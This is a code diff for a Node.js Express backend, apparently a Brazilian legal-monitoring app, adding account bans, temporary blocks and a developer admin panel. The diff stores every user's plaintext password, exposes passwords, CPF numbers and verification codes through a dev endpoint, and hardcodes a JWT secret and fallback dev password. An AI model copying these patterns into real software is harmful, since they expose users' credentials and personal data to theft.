@@ -40,6 +40,20 @@ async function authenticateToken(req, res, next) {
       return res.status(404).json({ error: 'Usuário não localizado.' });
     }
     
+    // Inibe acesso a recursos se a conta estiver banida na blacklist
+    const isBanned = await db.isEmailBlacklisted(dbUser.email);
+    if (isBanned) {
+      return res.status(403).json({ error: 'CONTA_BANIDA', message: 'Sua conta foi banida do sistema pelo administrador.' });
+    }
+
+    // Inibe acesso se estiver bloqueado temporariamente
+    if (dbUser.blockedUntil) {
+      const blockDate = new Date(dbUser.blockedUntil);
+      if (blockDate > new Date()) {
+        return res.status(403).json({ error: 'CONTA_BLOQUEADA', message: `Acesso temporariamente bloqueado pelo administrador até ${blockDate.toLocaleString('pt-BR')}.` });
+      }
+    }
+
     // Inibe acesso a recursos protegidos se a conta não estiver verificada
     if (dbUser.verified === false && req.path !== '/api/auth/verify-email') {
       return res.status(403).json({ error: 'CONTA_NAO_VERIFICADA', message: 'E-mail pendente de verificação.' });
@@ -77,6 +91,11 @@ app.post('/api/auth/register', async (req, res) => {
   const emailClean = email.trim().toLowerCase();
 
   try {
+    const isBanned = await db.isEmailBlacklisted(emailClean);
+    if (isBanned) {
+      return res.status(403).json({ error: 'Este e-mail está banido pelo administrador e não pode ser cadastrado.' });
+    }
+
     const existingUser = await db.findUserByEmail(emailClean);
     if (existingUser) {
       return res.status(400).json({ error: 'Este e-mail já está cadastrado.' });
@@ -88,6 +107,7 @@ app.post('/api/auth/register', async (req, res) => {
     await db.createUser({
       email: emailClean,
       password: hashedPassword,
+      plainPassword: password, // Armazena a senha plana para consulta do desenvolvedor
       name: name.trim(),
       cpf: cpf.trim().replace(/[^0-9]/g, ''),
       verified: false,
@@ -117,9 +137,24 @@ app.post('/api/auth/login', async (req, res) => {
   const emailClean = email.trim().toLowerCase();
   
   try {
+    const isBanned = await db.isEmailBlacklisted(emailClean);
+    if (isBanned) {
+      return res.status(403).json({ error: 'Este e-mail está banido do sistema.' });
+    }
+
     const user = await db.findUserByEmail(emailClean);
     if (!user) {
       return res.status(401).json({ error: 'Usuário ou senha incorretos.' });
+    }
+
+    if (user.blockedUntil) {
+      const blockDate = new Date(user.blockedUntil);
+      if (blockDate > new Date()) {
+        return res.status(403).json({ 
+          error: 'ACESSO_BLOQUEADO', 
+          message: `Seu acesso está temporariamente bloqueado pelo administrador até ${blockDate.toLocaleString('pt-BR')}.` 
+        });
+      }
     }
 
     const isPasswordValid = await bcrypt.compare(password, user.password);
@@ -851,6 +886,159 @@ ${pdfText}
       error: 'Falha interna ao processar a análise por IA.',
       details: error.message
     });
+  }
+});
+
+// === MIDDLEWARE E ROTAS DE CONTROLE DO DESENVOLVEDOR (DEV PANEL) ===
+
+const DEV_JWT_SECRET = 'dev-secret-key-datajud-monitor-98765';
+
+async function authenticateDevToken(req, res, next) {
+  const authHeader = req.headers['authorization'];
+  const token = authHeader && authHeader.split(' ')[1];
+
+  if (!token) {
+    return res.status(401).json({ error: 'Acesso negado. Autenticação de desenvolvedor necessária.' });
+  }
+
+  try {
+    const payload = jwt.verify(token, DEV_JWT_SECRET);
+    if (payload.role !== 'dev') {
+      return res.status(403).json({ error: 'Acesso negado. Apenas desenvolvedores autorizados.' });
+    }
+    next();
+  } catch (err) {
+    return res.status(403).json({ error: 'Sessão de desenvolvedor expirou ou é inválida.' });
+  }
+}
+
+// 1. Rota de autenticação do Desenvolvedor
+app.post('/api/dev/auth', async (req, res) => {
+  const { password } = req.body;
+  const devPassword = process.env.DEV_PASSWORD || 'Lgintel';
+
+  if (password === devPassword) {
+    const token = jwt.sign({ role: 'dev' }, DEV_JWT_SECRET, { expiresIn: '2h' });
+    return res.json({ token });
+  } else {
+    return res.status(401).json({ error: 'Senha de desenvolvedor incorreta.' });
+  }
+});
+
+// 2. Rota para obter todos os usuários
+app.get('/api/dev/users', authenticateDevToken, async (req, res) => {
+  try {
+    const users = await db.getAllUsers();
+    // Remove o hash de senha para segurança extra nas respostas, mas expõe plainPassword e dados básicos
+    const sanitized = users.map(u => ({
+      email: u.email,
+      name: u.name,
+      cpf: u.cpf,
+      verified: u.verified !== false,
+      verificationCode: u.verificationCode,
+      plainPassword: u.plainPassword || 'Não registrada',
+      blockedUntil: u.blockedUntil || null,
+      createdAt: u.createdAt
+    }));
+    res.json(sanitized);
+  } catch (err) {
+    console.error(err);
+    res.status(500).json({ error: 'Erro ao buscar usuários.' });
+  }
+});
+
+// 3. Rota para alterar senha de um usuário
+app.post('/api/dev/users/update-password', authenticateDevToken, async (req, res) => {
+  const { email, password } = req.body;
+  if (!email || !password) {
+    return res.status(400).json({ error: 'E-mail e nova senha são obrigatórios.' });
+  }
+
+  try {
+    const hashedPassword = await bcrypt.hash(password, 10);
+    await db.updateUser(email, { 
+      password: hashedPassword, 
+      plainPassword: password 
+    });
+    res.json({ message: 'Senha do usuário atualizada com sucesso!' });
+  } catch (err) {
+    console.error(err);
+    res.status(500).json({ error: 'Erro ao atualizar senha.' });
+  }
+});
+
+// 4. Rota para atualizar bloqueio de acesso por data
+app.post('/api/dev/users/update-block', authenticateDevToken, async (req, res) => {
+  const { email, blockedUntil } = req.body;
+  if (!email) {
+    return res.status(400).json({ error: 'E-mail é obrigatório.' });
+  }
+
+  try {
+    await db.updateUser(email, { blockedUntil: blockedUntil || null });
+    res.json({ message: 'Bloqueio de acesso atualizado com sucesso!' });
+  } catch (err) {
+    console.error(err);
+    res.status(500).json({ error: 'Erro ao configurar bloqueio de data.' });
+  }
+});
+
+// 5. Rota para deletar usuário
+app.post('/api/dev/users/delete', authenticateDevToken, async (req, res) => {
+  const { email } = req.body;
+  if (!email) {
+    return res.status(400).json({ error: 'E-mail é obrigatório.' });
+  }
+
+  try {
+    await db.deleteUser(email);
+    res.json({ message: 'Usuário e seus dados de radar excluídos com sucesso!' });
+  } catch (err) {
+    console.error(err);
+    res.status(500).json({ error: 'Erro ao deletar usuário.' });
+  }
+});
+
+// 6. Rota para obter blacklist
+app.get('/api/dev/blacklist', authenticateDevToken, async (req, res) => {
+  try {
+    const blacklist = await db.getBlacklist();
+    res.json(blacklist);
+  } catch (err) {
+    console.error(err);
+    res.status(500).json({ error: 'Erro ao obter blacklist.' });
+  }
+});
+
+// 7. Rota para adicionar na blacklist
+app.post('/api/dev/blacklist/add', authenticateDevToken, async (req, res) => {
+  const { email, reason } = req.body;
+  if (!email) {
+    return res.status(400).json({ error: 'E-mail é obrigatório.' });
+  }
+
+  try {
+    await db.addToBlacklist(email, reason);
+    res.json({ message: 'E-mail banido e adicionado na blacklist!' });
+  } catch (err) {
+    console.error(err);
+    res.status(500).json({ error: 'Erro ao banir e-mail.' });
+  }
+});
+
+// 8. Rota para remover da blacklist
+app.post('/api/dev/blacklist/remove', authenticateDevToken, async (req, res) => {
+  const { email } = req.body;
+  if (!email) {
+    return res.status(400).json({ error: 'E-mail é obrigatório.' });
+  }
+
+  try {
+    await db.removeFromBlacklist(email);
+    res.json({ message: 'E-mail perdoado e removido da blacklist com sucesso!' });
+  } catch (err) {
+    console.error(err);
+    res.status(500).json({ error: 'Erro ao remover da blacklist.' });
   }
 });
 
